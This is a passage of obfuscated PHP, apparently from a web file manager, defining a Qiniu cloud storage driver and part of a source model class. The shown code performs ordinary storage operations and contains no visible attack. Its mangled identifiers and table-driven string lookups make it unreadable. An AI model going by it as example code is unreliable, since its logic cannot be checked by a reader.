strtolower($Ä…àÉ”¾[$Óæõ­é[1376]]) : $Óæõ­é[12]; } public function size($´ĞñÒ¸) { $ã¸ƒ‡Ìô = $this->objectMeta($´ĞñÒ¸); return $ã¸ƒ‡Ìô ? $ã¸ƒ‡Ìô[$_SERVER[ì…™Î¶Ï][80]] : 0; } public function info($½½ Àìü) { if ($this->isFolder($½½ Àìü)) { return $this->folderInfo($½½ Àìü); } else { if ($this->isFile($½½ Àìü)) { return $this->fileInfo($½½ Àìü); } } return !1; } public function exist($‹öÂÈ‰) { return $this->isFile($‹öÂÈ‰) || $this->isFolder($‹öÂÈ‰); } public function isFile($ñ£™ëÙª) { return !$this->isFolder($ñ£™ëÙª) && $this->objectMeta($ñ£™ëÙª); } public function isFolder($ÖéÄäƒ¿) { return $this->cacheMethod($_SERVER[ì…™Î¶Ï][198], $ÖéÄäƒ¿); } protected function objectMeta($Êƒ¶Ùò) { return $this->cacheMethod($_SERVER[ì…™Î¶Ï][199], $Êƒ¶Ùò); } protected function _objectMeta($è¡ç¬˜ì) { $Ãıµ‰ş‘ =& $_SERVER[ì…™Î¶Ï]; try { $‹´¦Ÿ´µ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($è¡ç¬˜ì)); } catch (OSS\Core\OssException $º‰±”›’) { $‹´¦Ÿ´µ = !1; } if ($‹´¦Ÿ´µ) { $‹´¦Ÿ´µ[$Ãıµ‰ş‘[80]] = intval($‹´¦Ÿ´µ[$Ãıµ‰ş‘[1374]]); } return $‹´¦Ÿ´µ; } protected function _isFolder($÷‹ºæÖ™) { $•ã·† =& $_SERVER[ì…™Î¶Ï]; if ($÷‹ºæÖ™ == $•ã·†[12] || $÷‹ºæÖ™ == $•ã·†[8]) { return !0; } $ö˜’‘•‰ = array($•ã·†[1370] => $•ã·†[8], $•ã·†[1371] => rtrim($÷‹ºæÖ™, $•ã·†[8]) . $•ã·†[8], $•ã·†[1372] => 1, $•ã·†[1373] => $•ã·†[12]); $ƒ­‘ÖŞã = $this->client->listObjects($this->bucket, $ö˜’‘•‰); if ($ƒ­‘ÖŞã->getObjectList() || $ƒ­‘ÖŞã->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($»‚«Éºâ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ì…™Î¶Ï][1402]; $this->_init($»‚«Éºâ); } public function _init($ºÔş˜’º) { $şú…ªâî =& $_SERVER[ì…™Î¶Ï]; foreach ($ºÔş˜’º as $ãØß„“ç => $Ê¹­‘­´) { if (isset($this->{$ãØß„“ç})) { $this->{$ãØß„“ç} = $Ê¹­‘­´; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($şú…ªâî[1403] . LNG($şú…ªâî[1361])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ª°öÇ…€, $êš€Éá“ = '', $Õ«†¼ÙÚ = REPEAT_RENAME) { if ($this->setContent($ª°öÇ…€, $êš€Éá“)) { return $this->getPathOuter($ª°öÇ…€); } return !1; } public function mkdir($·ÖñØ¤œ, $×ÅšƒÇß = REPEAT_SKIP) { $ğƒ’§³ =& $_SERVER[ì…™Î¶Ï]; $¦²¿äúò = trim($·ÖñØ¤œ, $ğƒ’§³[8]); if ($this->_isFolder($¦²¿äúò)) { return $this->getPathOuter($¦²¿äúò); } $·ÖñØ¤œ = $¦²¿äúò . $ğƒ’§³[8]; $¾ÔóÌïä = get_path_this($¦²¿äúò); $ïÓá‹ÎÏ = $·ÖñØ¤œ . $¾ÔóÌïä; if (!$this->mkfile($ïÓá‹ÎÏ)) { return !1; } if (!$this->moveFile($ïÓá‹ÎÏ, $·ÖñØ¤œ)) { $this->delFile($ïÓá‹ÎÏ); return !1; } return $this->getPathOuter($¦²¿äúò); } public function copyFile($¥ÕñĞÀÇ, $Ê‹Àš˜) { $·è‘èŒ¹ = $this->bucketManager->copy($this->bucket, $¥ÕñĞÀÇ, $this->bucket, $Ê‹Àš˜, !0); return $·è‘èŒ¹ ? !1 : $this->getPathOuter($Ê‹Àš˜); } public function moveFile($ƒ¤å‰µ¯, $×ÀÚ†™Ü) { $ÏªÏçœ‚ = $this->bucketManager->move($this->bucket, $ƒ¤å‰µ¯, $this->bucket, $×ÀÚ†™Ü, !0); return $ÏªÏçœ‚ ? !1 : $this->getPathOuter($×ÀÚ†™Ü); } public function delFile($æ…òâ×ñ) { if (!$this->exist($æ…òâ×ñ)) { return !0; } $³ìŸ†³ô = $this->bucketManager->delete($this->bucket, $æ…òâ×ñ); return $³ìŸ†³ô ? !1 : !0; } public function delFolder($ª¤Ã¢·á) { $ª‡ò =& $_SERVER[ì…™Î¶Ï]; if (!$this->exist($ª¤Ã¢·á)) { return !0; } $this->listItemCache = !1; $±ŞŞÙ¼ = $this->fileList($ª¤Ã¢·á); $this->listItemCache = !0; $ûéÆü‹ş = trim($ª¤Ã¢·á, $ª‡ò[8]) . $ª‡ò[8]; if (!empty($ª¤Ã¢·á) && $ª¤Ã¢·á !== $ª‡ò[190] && !in_array($ûéÆü‹ş, $±ŞŞÙ¼[$ª‡ò[77]])) { $±ŞŞÙ¼[$ª‡ò[77]][] = $ûéÆü‹ş; } $Õ¼Ì¼ı³ = $this->delByBatch($±ŞŞÙ¼[$ª‡ò[76]]); if (!$Õ¼Ì¼ı³) { return !1; } $Õ¼Ì¼ı³ = $this->delByBatch($±ŞŞÙ¼[$ª‡ò[77]]); if (!$Õ¼Ì¼ı³) { return !1; } return $this->delFile($ûéÆü‹ş); } private function delByBatch($¡Ç­¡) { foreach (array_chunk($¡Ç­¡, 1000) as $ãĞêš™¹) { $ßİ•ÜË = $this->bucketManager->buildBatchDelete($this->bucket, $ãĞêš™¹); list($½úô¦·Æ, $–‘ü«Áû) = $this->bucketManager->batch($ßİ•ÜË); if ($–‘ü«Áû) { return !1; } } return !0; } public function rename($Åı“ÒÅ, $ïŸœêÛÓ) { return $this->renameObject($Åı“ÒÅ, $ïŸœêÛÓ); } public function fileInfo($œ¯ğ —¯, $ÅÊİı = false, $®ººó¤ù = array()) { $„á¿©Á¿ =& $_SERVER[ì…™Î¶Ï]; $™ƒåÍ®“ = array($„á¿©Á¿[32] => $this->pathThis($œ¯ğ —¯), $„á¿©Á¿[78] => $this->getPathOuter($„á¿©Á¿[8] . $œ¯ğ —¯), $„á¿©Á¿[33] => $„á¿©Á¿[192], $„á¿©Á¿[80] => isset($®ººó¤ù[$„á¿©Á¿[1404]]) ? $®ººó¤ù[$„á¿©Á¿[1404]] : 0, $„á¿©Á¿[167] => $this->ext($œ¯ğ —¯)); if ($ÅÊİı) { return $™ƒåÍ®“; } $™ƒåÍ®“[$„á¿©Á¿[193]] = $™ƒåÍ®“[$„á¿©Á¿[86]] = 0; $™ƒåÍ®“[$„á¿©Á¿[194]] = $™ƒåÍ®“[$„á¿©Á¿[195]] = !0; if (empty($®ººó¤ù)) { $®ººó¤ù = $this->objectMeta($œ¯ğ —¯); if (!$®ººó¤ù) { return $™ƒåÍ®“; } } if (isset($®ººó¤ù[$„á¿©Á¿[1405]])) { $™ƒåÍ®“[$„á¿©Á¿[86]] = substr($®ººó¤ù[$„á¿©Á¿[1405]] . $„á¿©Á¿[12], 0, 10); } if (isset($®ººó¤ù[$„á¿©Á¿[1404]])) { $™ƒåÍ®“[$„á¿©Á¿[80]] = $®ººó¤ù[$„á¿©Á¿[1404]]; } return $™ƒåÍ®“; } public function folderInfo($®êßÅúÅ, $Íéçæ¦£ = false) { $åØÁ…‹ª =& $_SERVER[ì…™Î¶Ï]; $ˆÏß®î¼ = array($åØÁ…‹ª[32] => $this->pathThis($®êßÅúÅ), $åØÁ…‹ª[78] => $this->getPathOuter($åØÁ…‹ª[8] . $®êßÅúÅ), $åØÁ…‹ª[33] => $åØÁ…‹ª[79]); if ($Íéçæ¦£) { return $ˆÏß®î¼; } $ˆÏß®î¼[$åØÁ…‹ª[193]] = $ˆÏß®î¼[$åØÁ…‹ª[86]] = 0; $ˆÏß®î¼[$åØÁ…‹ª[194]] = $ˆÏß®î¼[$åØÁ…‹ª[195]] = !0; $®êßÅúÅ = rtrim($®êßÅúÅ, $åØÁ…‹ª[8]) . $åØÁ…‹ª[8]; $²şİõ‹ = $this->objectMeta($®êßÅúÅ); if (isset($²şİõ‹[$åØÁ…‹ª[1405]])) { $ˆÏß®î¼[$åØÁ…‹ª[86]] = substr($²şİõ‹[$åØÁ…‹ª[1405]] . $åØÁ…‹ª[12], 0, 10); } return $ˆÏß®î¼; } public function listPath($ïä×·ŸÇ, $íšİ‚ßˆ = false) { $©İšÌâå =& $_SERVER[ì…™Î¶Ï]; $¹Çñ¨¢æ = $this->fileList($ïä×·ŸÇ, $©İšÌâå[8], !0); foreach ($¹Çñ¨¢æ[$©İšÌâå[77]] as $½¡ãÑ’¶ => $³øò¸ˆ’) { $¹Çñ¨¢æ[$©İšÌâå[77]][$½¡ãÑ’¶] = $this->folderInfo($³øò¸ˆ’, $íšİ‚ßˆ); } foreach ($¹Çñ¨¢æ[$©İšÌâå[76]] as $½¡ãÑ’¶ => $³øò¸ˆ’) { $¹Çñ¨¢æ[$©İšÌâå[76]][$½¡ãÑ’¶] = $this->fileInfo($³øò¸ˆ’[$©İšÌâå[95]], $íšİ‚ßˆ, $³øò¸ˆ’); } return $¹Çñ¨¢æ; } public function has($Ù…ï—Şè, $¶ÁéüÂ = false, $ƒñÊª¹¸ = true) { $³Íæ…¨® =& $_SERVER[ì…™Î¶Ï]; $Ù…ï—Şè = trim($Ù…ï—Şè, $³Íæ…¨®[8]); $·‰Ò«°‰ = empty($Ù…ï—Şè) && $Ù…ï—Şè !== $³Íæ…¨®[190] ? $³Íæ…¨®[12] : $Ù…ï—Şè . $³Íæ…¨®[8]; $Á®¦¸–È = $³Íæ…¨®[12]; $ŒŸ¸À…² = 500; $ãÛäƒø¤ = $³Íæ…¨®[8]; $Ôğß‘‹ = $ˆØ•ãöø = 0; while (!0) { check_abort(); list($ŠÄøóÚ, $ôÊ‡ûò‚) = $this->bucketManager->listFiles($this->bucket, $·‰Ò«°‰, $Á®¦¸–È, $ŒŸ¸À…², $ãÛäƒø¤); if ($ôÊ‡ûò‚) { break; } $Á®¦¸–È = array_key_exists($³Íæ…¨®[1373], $ŠÄøóÚ) ? $Á®¦¸–È = $ŠÄøóÚ[$³Íæ…¨®[1406]] : $³Íæ…¨®[12]; if ($¶ÁéüÂ) { if (!empty($ŠÄøóÚ[$³Íæ…¨®[1407]])) { $Ôğß‘‹ += count($ŠÄøóÚ[$³Íæ…¨®[1407]]); } if (!empty($ŠÄøóÚ[$³Íæ…¨®[1408]])) { $ˆØ•ãöø += count($ŠÄøóÚ[$³Íæ…¨®[1408]]); } if ($Á®¦¸–È === $³Íæ…¨®[12]) { break; } continue; } if ($ƒñÊª¹¸) { if (!empty($ŠÄøóÚ[$³Íæ…¨®[1407]])) { return !0; } } else { if (!empty($ŠÄøóÚ[$³Íæ…¨®[1408]])) { return !0; } } if ($Á®¦¸–È === $³Íæ…¨®[12]) { break; } } if ($¶ÁéüÂ) { return array($³Íæ…¨®[202] => $Ôğß‘‹, $³Íæ…¨®[203] => $ˆØ•ãöø); } return !1; } public function listAll($—µÉİª¶) { $áıÚ¡î =& $_SERVER[ì…™Î¶Ï]; $ÂÄç½ïŸ = $this->fileList($—µÉİª¶, $áıÚ¡î[12], !0); $Ç’³Ç « = array(); foreach ($ÂÄç½ïŸ[$áıÚ¡î[76]] as $—Ì„Õ²š) { $Ç’³Ç «[$—Ì„Õ²š[$áıÚ¡î[95]]] = $—Ì„Õ²š[$áıÚ¡î[80]]; } foreach ($ÂÄç½ïŸ[$áıÚ¡î[77]] as $—Ì„Õ²š) { if (is_string($—Ì„Õ²š)) { $Ç’³Ç «[$—Ì„Õ²š] = 0; } } return $this->listAllFiles($—µÉİª¶, array_keys($Ç’³Ç «), $Ç’³Ç «); } private function fileList($ë‹´è¼é, $ó¸Îäòâ = '', $øú õ’– = 0) { $ ì”à´ê =& $_SERVER[ì…™Î¶Ï]; $ë‹´è¼é = trim($ë‹´è¼é, $ ì”à´ê[8]); $¸Ò´ï£¹ = empty($ë‹´è¼é) && $ë‹´è¼é !== $ ì”à´ê[190] ? $ ì”à´ê[12] : $ë‹´è¼é . $ ì”à´ê[8]; $·£¤ÚÒÇ = $ ì”à´ê[12]; $¿Ì—ëã = 1000; $µáØòÚ§ = $this->listItemCache === !1 ? !1 : !0; $åªµåÙË = $¤ÉÖ°³Å = array(); while (!0) { check_abort(); list($ıñøšé, $öóîûğó) = $this->bucketManager->listFiles($this->bucket, $¸Ò´ï£¹, $·£¤ÚÒÇ, $¿Ì—ëã, $ó¸Îäòâ); if ($öóîûğó) { break; } $·£¤ÚÒÇ = array_key_exists($ ì”à´ê[1373], $ıñøšé) ? $·£¤ÚÒÇ = $ıñøšé[$ ì”à´ê[1406]] : $ ì”à´ê[12]; $ª†ÏìÃ… = isset($ıñøšé[$ ì”à´ê[1407]]) ? $ıñøšé[$ ì”à´ê[1407]] : array(); $äŸï²¶è = isset($ıñøšé[$ ì”à´ê[1408]]) ? $ıñøšé[$ ì”à´ê[1408]] : array(); foreach ($ª†ÏìÃ… as $ÍøæËÕÛ) { if ($ÍøæËÕÛ[$ ì”à´ê[95]] == $¸Ò´ï£¹) { continue; } $™™úˆ×‡ = $ÍøæËÕÛ[$ ì”à´ê[95]]; $¤ş·‰Î = $ÍøæËÕÛ[$ ì”à´ê[1404]]; $ÍøæËÕÛ[$ ì”à´ê[80]] = $¤ş·‰Î; $Ò³ãßŸ– = $¤ş·‰Î == 0 && substr($™™úˆ×‡, strlen($™™úˆ×‡) - 1, 1) == $ ì”à´ê[8] ? !0 : !1; if ($µáØòÚ§) { $this->cacheMethod($ ì”à´ê[198], $™™úˆ×‡, $Ò³ãßŸ–); $this->cacheMethod($ ì”à´ê[199], $™™úˆ×‡, $ÍøæËÕÛ); } if ($Ò³ãßŸ–) { $åªµåÙË[] = $™™úˆ×‡; continue; } $¤ÉÖ°³Å[] = $øú õ’– ? $ÍøæËÕÛ : $™™úˆ×‡; } foreach ($äŸï²¶è as $™™úˆ×‡) { if ($™™úˆ×‡ == $¸Ò´ï£¹) { continue; } $åªµåÙË[] = $™™úˆ×‡; if ($µáØòÚ§) { $this->cacheMethod($ ì”à´ê[198], $™™úˆ×‡, !0); } } if ($·£¤ÚÒÇ === $ ì”à´ê[12]) { break; } } if ($µáØòÚ§) { $this->cacheMethod($ ì”à´ê[198], $ë‹´è¼é, !0); } return array($ ì”à´ê[77] => $åªµåÙË, $ ì”à´ê[76] => $¤ÉÖ°³Å); } public function canRead($·Á§²ÂÍ) { return $this->exist($·Á§²ÂÍ) ? !0 : !1; } public function canWrite($„ğÛâÆ…) { return $this->exist($„ğÛâÆ…) ? !0 : !1; } public function getContent($—†¬˜©è) { return $this->fileSubstr($—†¬˜©è, 0, -1); } public function setContent($·™ÌÌšµ, $ÕµÁ‚… = '') { $ø‡ªÓúƒ = $this->tempFile($this->pathThis($·™ÌÌšµ)); file_put_contents($ø‡ªÓúƒ, $ÕµÁ‚…); if ($this->upload($·™ÌÌšµ, $ø‡ªÓúƒ)) { $this->tempFileRemve($ø‡ªÓúƒ); return !0; } return !1; } public function refreshUrls($ÑµÚÃî) { $½®§áÛ =& $_SERVER[ì…™Î¶Ï]; $ıÂÆî…‡ = array(); if (is_array($ÑµÚÃî)) { foreach ($ÑµÚÃî as $Öû®‡Àæ) { $ıÂÆî…‡[] = $this->link($Öû®‡Àæ); } } else { $ıÂÆî…‡[] = $this->link($ÑµÚÃî); } $¤§Ş‚‰¡ = new Qiniu\Cdn\CdnManager($this->auth); list($±¼ğ¿—, $‹á•·³) = $¤§Ş‚‰¡->refreshUrls($ıÂÆî…‡); if ($‹á•·³) { return !1; } return $±¼ğ¿—[$½®§áÛ[1157]] == $½®§áÛ[735] ? !0 : !1; } public function fileSubstr($ˆüßÄ‘Í, $ê¬Ó®Ù½, $¥ù±Í˜) { $‰¬Ì·™ =& $_SERVER[ì…™Î¶Ï]; if (!($õÉ´ê¨± = $this->link($ˆüßÄ‘Í))) { return !1; } $µêÖĞƒ = !1; if ($¥ù±Í˜ > 0) { $ôŸÙïÎ = $ê¬Ó®Ù½ + $¥ù±Í˜ - 1; $µêÖĞƒ = array($‰¬Ì·™[1409] . $ê¬Ó®Ù½ . $‰¬Ì·™[451] . $ôŸÙïÎ); } $öÛ½œÇö = url_request($õÉ´ê¨±, $‰¬Ì·™[225], !1, $µêÖĞƒ); return $öÛ½œÇö[$‰¬Ì·™[725]] ? $öÛ½œÇö[$‰¬Ì·™[1167]] : !1; } public function upload($¦ŒÂ½Ü±, $Ãı‡öƒì, $ü®Æéœ† = false, $ÕÍùü… = REPEAT_REPLACE) { $Ş•©èÀÜ = new Qiniu\Storage\UploadManager(); $¯€¾±Èğ = $this->auth->uploadToken($this->bucket, $¦ŒÂ½Ü±); $´‚¾È‚ = get_file_mime(get_path_ext($Ãı‡öƒì)); list($ë¦µ­ã¬, $×Ë‡·ƒ“) = $Ş•©èÀÜ->putFile($¯€¾±Èğ, $¦ŒÂ½Ü±, $Ãı‡öƒì, null, $´‚¾È‚); return $×Ë‡·ƒ“ ? !1 : $this->getPathOuter($¦ŒÂ½Ü±); } public function uploadFormData($™€›æñã, $èËß‘’š = 3600) { return $this->uploadToken($™€›æñã, $èËß‘’š); } public function multiUploadFormData($ÏÛÇÄÛÈ, $ÚĞ©İÊû = 3600) { return $this->uploadToken($ÏÛÇÄÛÈ, $ÚĞ©İÊû); } private function uploadToken($—´‡Å‚, $ƒÅ…èª = 3600) { $¶ê¹ü§ =& $_SERVER[ì…™Î¶Ï]; $òŸÔòµ¤ = $ƒÅ…èª; $ÚØŠ¿Èï = array($¶ê¹ü§[1410] => $¶ê¹ü§[1411]); $¸ó‰º ‚ = $—´‡Å‚; $ä©¹÷‡œ = $this->auth->uploadToken($this->bucket, $¸ó‰º ‚, $òŸÔòµ¤, $ÚØŠ¿Èï, !0); $È­á§¾ = empty($this->region) || $this->region == $¶ê¹ü§[1412] ? $¶ê¹ü§[12] : $¶ê¹ü§[451] . $this->region; $ß‹®–¡» = http_type() . "\72\x2f\x2f\165\160\x6c\157\x61\x64{$È­á§¾}\x2e\x71\x69\156\x69\165\160\x2e\143\157\x6d\x2f"; return array($¶ê¹ü§[1413] => $ä©¹÷‡œ, $¶ê¹ü§[1414] => $ß‹®–¡»); } public function download($í¡Ò¬˜, $‰€ˆƒº…) { $Ş‡‡…‘Ô = IO::getPathInner(IO::mkfile($‰€ˆƒº…)); if (!($í ®Ÿá = $this->link($í¡Ò¬˜))) { return !1; } $š×†‘Èº = 0; $Õôß¬ƒè = 1024 * 200; $ÃîÈŸâä = fopen($Ş‡‡…‘Ô, $_SERVER[ì…™Î¶Ï][1415]); while (!0) { $œ¿øÒÇ† = $this->fileSubstr($í¡Ò¬˜, $š×†‘Èº, $Õôß¬ƒè); if ($œ¿øÒÇ† === !1) { return !1; } fwrite($ÃîÈŸâä, $œ¿øÒÇ†); $š×†‘Èº += $Õôß¬ƒè; if (strlen($œ¿øÒÇ†) < $Õôß¬ƒè) { break; } } fclose($ÃîÈŸâä); return $‰€ˆƒº…; } public function link($—´¯, $âÇöâ  = '') { if (!$this->isFile($—´¯)) { return !1; } $†å÷õ¡ß = $this->getHost() . $_SERVER[ì…™Î¶Ï][8] . $this->pathEncode($—´¯) . $âÇöâ ; return $this->auth->privateDownloadUrl($†å÷õ¡ß, 3600 * 12); } public function fileOut($Ìäï’Ó², $ğıäò¸ç = false, $×¡¿Ñ›² = false, $î¹Øä¤‚ = '') { $À£©—èà =& $_SERVER[ì…™Î¶Ï]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ìäï’Ó², $ğıäò¸ç, $×¡¿Ñ›², $î¹Øä¤‚); } if (!$×¡¿Ñ›²) { $×¡¿Ñ›² = $this->pathThis($Ìäï’Ó²); } $ÆŒ³Î¤§ = $ğıäò¸ç ? $À£©—èà[1416] . rawurlencode($×¡¿Ñ›²) : $À£©—èà[12]; $ŸˆöŸÜ¦ = $this->link($Ìäï’Ó², $ÆŒ³Î¤§); $this->fileOutLink($ŸˆöŸÜ¦); } public function fileOutServer($îßÎ¼š…, $ú©ôÊå© = false, $µ‘ô×òì = false, $¶ª×åô¢ = '') { parent::fileOut($îßÎ¼š…, $ú©ôÊå©, $µ‘ô×òì, $¶ª×åô¢); } public function fileOutImage($Ú½Ãò¨, $ıòş÷ÑÁ = 250) { $ŞËï¦ ½ = $this->link($Ú½Ãò¨, $_SERVER[ì…™Î¶Ï][1417] . $ıòş÷ÑÁ); $this->fileOutLink($ŞËï¦ ½); } public function fileOutImageServer($ºÇ¿äÈ©, $Ã¾Â†Õ± = 250) { parent::fileOutImage($ºÇ¿äÈ©, $Ã¾Â†Õ±); } public function hashMd5($š›¬‰¯’) { $ğ–—¹•Š =& $_SERVER[ì…™Î¶Ï]; $ñ€í€¾¬ = $this->objectMeta($š›¬‰¯’); return isset($ñ€í€¾¬[$ğ–—¹•Š[207]]) ? $ñ€í€¾¬[$ğ–—¹•Š[207]] : !1; $¢¤çİô¤ = $this->link($š›¬‰¯’, $ğ–—¹•Š[1418]); } public function size($ä­ƒïã») { $şş÷ã‡® = $this->objectMeta($ä­ƒïã»); return $şş÷ã‡® ? $şş÷ã‡®[$_SERVER[ì…™Î¶Ï][80]] : 0; } public function info($¨í„‡—) { if ($this->isFolder($¨í„‡—)) { return $this->folderInfo($¨í„‡—); } else { if ($this->isFile($¨í„‡—)) { return $this->fileInfo($¨í„‡—); } } return !1; } public function exist($ÀƒóÀŞ½) { return $this->isFile($ÀƒóÀŞ½) || $this->isFolder($ÀƒóÀŞ½); } public function isFile($Ëı­Åâê) { return !$this->isFolder($Ëı­Åâê) && $this->objectMeta($Ëı­Åâê); } public function isFolder($ÎŞ†§¿Ú) { return $this->cacheMethod($_SERVER[ì…™Î¶Ï][198], $ÎŞ†§¿Ú); } protected function objectMeta($¸»÷‚‡é) { return $this->cacheMethod($_SERVER[ì…™Î¶Ï][199], $¸»÷‚‡é); } protected function _objectMeta($úáÀ©Ï) { $úœì¬¾­ =& $_SERVER[ì…™Î¶Ï]; list($–ƒÁú­, $€ÀøÆ×) = $this->bucketManager->stat($this->bucket, $úáÀ©Ï); if ($–ƒÁú­) { $–ƒÁú­[$úœì¬¾­[80]] = intval($–ƒÁú­[$úœì¬¾­[1404]]); } return $–ƒÁú­; } protected function _isFolder($Ÿ»÷ô¹) { $•£İµ—Š =& $_SERVER[ì…™Î¶Ï]; if ($Ÿ»÷ô¹ == $•£İµ—Š[12] || $Ÿ»÷ô¹ == $•£İµ—Š[8]) { return !0; } list($è‡’•«, $¥â”ÍØÊ) = $this->bucketManager->listFiles($this->bucket, trim($Ÿ»÷ô¹, $•£İµ—Š[8]) . $•£İµ—Š[8], $•£İµ—Š[12], 1, $•£İµ—Š[8]); return !empty($è‡’•«[$•£İµ—Š[1407]]) || !empty($è‡’•«[$•£İµ—Š[1408]]) ? !0 : !1; } } goto F¿‰áœğÌ×; cŸåäÒŞİ«: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($˜§¥É³œ) { $—Ì®¾ÇÁ =& $_SERVER[ì…™Î¶Ï]; $îÙ©¶Õ = Model($—Ì®¾ÇÁ[504])->where(array($—Ì®¾ÇÁ[1622] => $˜§¥É³œ))->find(); $Ñ†Ü÷•Ç = $this->_mkdirRoot(SourceModel::TYPE_USER, $˜§¥É³œ, $îÙ©¶Õ[$—Ì®¾ÇÁ[32]]); $this->userDesktopAdd($Ñ†Ü÷•Ç); return $Ñ†Ü÷•Ç; } public function userDesktopAdd($ÈçØ·¿Í) { $‡ŠµÒå˜ =& $_SERVER[ì…™Î¶Ï]; $ÑÔ‹¿‹— = LNG($‡ŠµÒå˜[2061]); $ÊÖôûöî = $this->mkdir($ÈçØ·¿Í, $ÑÔ‹¿‹—); $this->metaSet($ÊÖôûöî, $‡ŠµÒå˜[2062], $‡ŠµÒå˜[89]); $this->metaSet($ÈçØ·¿Í, $‡ŠµÒå˜[2063], $ÊÖôûöî); } public function groupRootAdd($‰æ¾ıÕ) { $Œ´Èâùì =& $_SERVER[ì…™Î¶Ï]; $¤ŸÇˆ = Model($Œ´Èâùì[513])->where(array($Œ´Èâùì[1886] => $‰æ¾ıÕ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $‰æ¾ıÕ, $¤ŸÇˆ[$Œ´Èâùì[32]]); } public function systemRootPathAdd($˜õº…²) { if ($˜õº…² != $_SERVER[ì…™Î¶Ï][528]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $˜õº…²); } public function userRootRemove($êœŒ¶¸ô) { $¤ÎŠƒ÷¨ = $this->sourceRoot(SourceModel::TYPE_USER, $êœŒ¶¸ô); if (!$¤ÎŠƒ÷¨) { return; } $this->remove($¤ÎŠƒ÷¨, !1); } public function groupRootRemove($èú¹“¡²) { $Ç°Ñ¾¹ş = $this->sourceRoot(SourceModel::TYPE_GROUP, $èú¹“¡²); if (!$Ç°Ñ¾¹ş) { return; } $this->remove($Ç°Ñ¾¹ş, !1); } private function _mkdirRoot($ŠÔÅàß¨, $ûœ€ÚÍÌ, $ëƒì¸ƒ) { $úÃ»Ú¸ =& $_SERVER[ì…™Î¶Ï]; $Á ¼ĞŞ™ = array($úÃ»Ú¸[393] => 0, $úÃ»Ú¸[571] => $ŠÔÅàß¨, $úÃ»Ú¸[572] => $ûœ€ÚÍÌ, $úÃ»Ú¸[568] => 1, $úÃ»Ú¸[573] => USER_ID, $úÃ»Ú¸[574] => USER_ID, $úÃ»Ú¸[569] => $úÃ»Ú¸[12], $úÃ»Ú¸[575] => $úÃ»Ú¸[522], $úÃ»Ú¸[421] => 0, $úÃ»Ú¸[570] => 0, $úÃ»Ú¸[459] => 0, $úÃ»Ú¸[576] => $úÃ»Ú¸[12]); if ($Ç“øÇú = $this->where($Á ¼ĞŞ™)->find()) { return $Ç“øÇú[$úÃ»Ú¸[394]]; } $îçî–ä¸ = "\x4d\x6f\x64\145\154\123\157\x75\162\143\145\x2e\155\x6b\x64\151\x72\122\x6f\157\x74\56{$ŠÔÅàß¨}\x2e{$ûœ€ÚÍÌ}\x2e" . $ëƒì¸ƒ; CacheLock::lock($îçî–ä¸); $Á ¼ĞŞ™[$úÃ»Ú¸[32]] = $ëƒì¸ƒ; $îÕšµúõ = $this->add($Á ¼ĞŞ™); $£Ûğà‡ğ = array($úÃ»Ú¸[577] => short_id($îÕšµúõ)); $this->where(array($úÃ»Ú¸[409] => $îÕšµúõ))->save($£Ûğà‡ğ); CacheLock::unlock($îçî–ä¸); return $îÕšµúõ; } private function sourceRoot($ÄŒÔ°¾, $£ş­¥, $²ó†§ùí = false) { $Î‰‹ =& $_SERVER[ì…™Î¶Ï]; $–Ï“÷™ = array($Î‰‹[393] => 0, $Î‰‹[571] => $ÄŒÔ°¾, $Î‰‹[572] => $£ş­¥); if ($Ò¤ü¢ = $this->where($–Ï“÷™)->find()) { return $²ó†§ùí ? $Ò¤ü¢ : $Ò¤ü¢[$Î‰‹[394]]; } return !1; } public function sourceRootGroup($Ÿê´ë…À) { $¸¹çş›¦ =& $_SERVER[ì…™Î¶Ï]; if (is_string($Ÿê´ë…À)) { $Ÿê´ë…À = array($Ÿê´ë…À); } $µÈµ›Ò = $this->listSourceRoot(SourceModel::TYPE_GROUP, $Ÿê´ë…À, $¸¹çş›¦[181]); $¶óèÚ†— = array($¸¹çş›¦[364] => $µÈµ›Ò, $¸¹çş›¦[361] => array($¸¹çş›¦[734] => count($Ÿê´ë…À))); $this->_listDataApply($¶óèÚ†—[$¸¹çş›¦[364]]); $this->_listMake($¶óèÚ†—); return array_to_keyvalue($¶óèÚ†—[$¸¹çş›¦[77]], $¸¹çş›¦[495]); } public function mkfile($Şà²úø, $ùêª¶¿, $¢–•²µ = '', $¬õ”Ç—Œ = REPEAT_RENAME) { $ı›Î‚Á« =& $_SERVER[ì…™Î¶Ï]; $¶ÉÕÔµ» = Model($ı›Î‚Á«[594])->addFileByContent($¢–•²µ, $ùêª¶¿); return $this->_createFileCall($Şà²úø, $ùêª¶¿, $¶ÉÕÔµ», $¬õ”Ç—Œ, $ı›Î‚Á«[1312]); } public function addFile($ª‡”´Ûê, $”ÈÓÀµ‡, $ìŠ‘·´€, $Úå¨¥‚À = false, $Ê•›¤Ò’ = REPEAT_RENAME) { $ØÆàËí½ = Model($_SERVER[ì…™Î¶Ï][594])->addFile($”ÈÓÀµ‡, $ìŠ‘·´€, $Úå¨¥‚À); return $this->_createFileCall($ª‡”´Ûê, $ìŠ‘·´€, $ØÆàËí½, $Ê•›¤Ò’); } public function addFileByFileID($•‡Ç“øÍ, $Ó‹åÜôÃ, $Úâ‘„Òø, $×Øûœ¡Ø = REPEAT_RENAME) { $ÚıÓÆ¨š =& $_SERVER[ì…™Î¶Ï]; $÷¾í‹Ù = Model($ÚıÓÆ¨š[594])->find($Ó‹åÜôÃ); Model($ÚıÓÆ¨š[594])->linkAdd($Ó‹åÜôÃ); return $this->_createFileCall($•‡Ç“øÍ, $Úâ‘„Òø, $÷¾í‹Ù, 